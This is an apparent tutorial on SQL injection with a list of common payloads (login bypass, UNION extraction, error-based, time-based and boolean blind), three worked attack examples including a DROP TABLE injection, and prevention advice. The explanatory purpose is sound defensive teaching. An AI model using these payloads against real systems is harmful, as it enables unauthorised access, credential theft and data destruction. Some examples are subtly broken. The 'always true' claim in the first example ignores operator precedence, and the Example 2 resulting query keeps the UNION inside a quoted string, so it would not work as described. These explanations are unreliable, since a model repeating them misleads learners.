## Understanding SQL Injection

SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in an application's software by manipulating SQL queries. Attackers can gain unauthorized access to a database, retrieve sensitive data, or even modify or delete data. This vulnerability typically arises when user input is improperly sanitized before being included in SQL statements.

### How SQL Injection Works

When an application constructs SQL queries using user input without proper validation or escaping, an attacker can input malicious SQL code. This code is then executed by the database, leading to unintended actions.

For example, consider a simple SQL query that checks for a user’s credentials:

```sql
SELECT * FROM users WHERE username = 'user' AND password = 'pass';
```

If an attacker inputs the following for the username:

```
user' OR '1'='1
```

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = 'user' OR '1'='1' AND password = 'pass';
```

This query will always return true, allowing the attacker to bypass authentication.

<hr>

## Common SQL Injection Payloads

Here are some common SQL injection payloads that attackers might use:

### 1. Bypassing Authentication

- **Payload**: `' OR '1'='1' -- `
- **Description**: This payload can be used to bypass login forms by making the condition always true.

### 2. Union-Based SQL Injection

- **Payload**: `1 UNION SELECT username, password FROM users -- `
- **Description**: This payload attempts to combine the results of two queries, allowing the attacker to retrieve data from another table.

### 3. Error-Based SQL Injection

- **Payload**: `1' AND 1=CONVERT(int, (SELECT @@version)) -- `
- **Description**: This payload can be used to extract database version information by causing an error that reveals details about the database.

### 4. Time-Based Blind SQL Injection

- **Payload**: `1' WAITFOR DELAY '00:00:10' -- `
- **Description**: This payload causes the database to wait for a specified time, allowing the attacker to infer whether the query is true or false based on the response time.

### 5. Boolean-Based Blind SQL Injection

- **Payload**: `1' AND '1'='1' -- `
- **Description**: This payload checks if a condition is true. If the application behaves differently, the attacker can infer information about the database.

<hr>

## Examples of SQL Injection Attacks

### Example 1: Login Bypass

**Vulnerable Code:**

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```

**User Input:**

- Username: `admin' -- `
- Password: `anything`

**Resulting Query:**

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything';
```

This query will return the admin user without needing a password.

### Example 2: Data Extraction

**Vulnerable Code:**

```sql
SELECT * FROM products WHERE id = '$product_id';
```

**User Input:**

- Product ID: `1 UNION SELECT username, password FROM users -- `

**Resulting Query:**

```sql
SELECT * FROM products WHERE id = '1 UNION SELECT username, password FROM users -- ';
```

This query will return product data along with usernames and passwords from the users table.

### Example 3: Dropping a Table

**Vulnerable Code:**

```sql
DELETE FROM users WHERE username = '$username';
```

**User Input:**

- Username: `admin'; DROP TABLE users; -- `

**Resulting Query:**

```sql
DELETE FROM users WHERE username = 'admin'; DROP TABLE users; -- ';
```

This query will delete the entire users table.

<hr>

## Prevention Techniques

To protect against SQL injection, consider the following best practices:

- **Use Prepared Statements**: Always use parameterized queries or prepared statements to separate SQL code from data.
- **Input Validation**: Validate and sanitize all user inputs to ensure they conform to expected formats.
- **Least Privilege Principle**: Limit database user permissions to only what is necessary for the application.
- **Web Application Firewalls (WAF)**: Implement WAFs to filter out malicious requests.
- **Regular Security Audits**: Conduct regular security assessments and code reviews to identify vulnerabilities.

By understanding SQL injection and implementing these preventive measures, you can significantly reduce the risk of such attacks on your applications.